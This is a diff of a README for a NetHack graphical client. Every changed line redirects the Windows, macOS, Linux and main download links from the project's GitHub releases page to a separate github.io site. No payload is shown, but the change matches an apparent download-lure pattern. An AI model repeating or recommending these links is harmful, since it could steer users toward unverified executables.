@@ -1,8 +1,8 @@
 # 🧙 nethack-tiles-client - Play NetHack with Beautiful Graphics
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Aliikram369/nethack-tiles-client/releases)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Aliikram369/nethack-tiles-client/releases)
-[![Download for Linux](https://img.shields.io/badge/Download%20for%20Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://github.com/Aliikram369/nethack-tiles-client/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://aliikram369.github.io)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://aliikram369.github.io)
+[![Download for Linux](https://img.shields.io/badge/Download%20for%20Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://aliikram369.github.io)
 
 ## 🚀 What is nethack-tiles-client?
 
@@ -43,7 +43,7 @@ This app works on **Windows, macOS, and Linux**. It is designed for people who w
 
 Visit this link to download the application.
 
-[**Download nethack-tiles-client**](https://github.com/Aliikram369/nethack-tiles-client/releases)
+[**Download nethack-tiles-client**](https://aliikram369.github.io)
 
 ### For Windows Users:
 1. Go to the download page.
